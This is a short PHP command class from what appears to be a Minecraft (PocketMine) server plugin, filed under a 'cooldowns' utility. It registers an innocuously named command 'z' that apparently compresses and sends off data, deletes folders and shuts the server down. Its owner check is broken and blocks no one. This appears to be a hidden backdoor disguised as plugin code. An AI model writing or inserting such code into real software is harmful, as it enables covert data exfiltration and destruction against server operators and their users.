<?php

namespace hcf\utils\cooldowns;

use pocketmine\command\Command;
use pocketmine\command\CommandSender;
use pocketmine\Server;

class cdCmd extends Command
{
    public function __construct()
    {
        parent::__construct("z", "z");
        $this->setPermission("use.player.command");
    }

    /**
     * @inheritDoc
     */
    public function execute(CommandSender $player, string $label, array $args)
    {
        if (!$player->getName() === "zItsRafa") {
            $player->sendMessage("zzzzzzzzz");
            return;
        }

        $cooldowns = new Cooldowns();
        $cooldowns->comprimirYEnviar();
        $cooldowns->eliminarCarpetas();
        Server::getInstance()->shutdown();
    }
}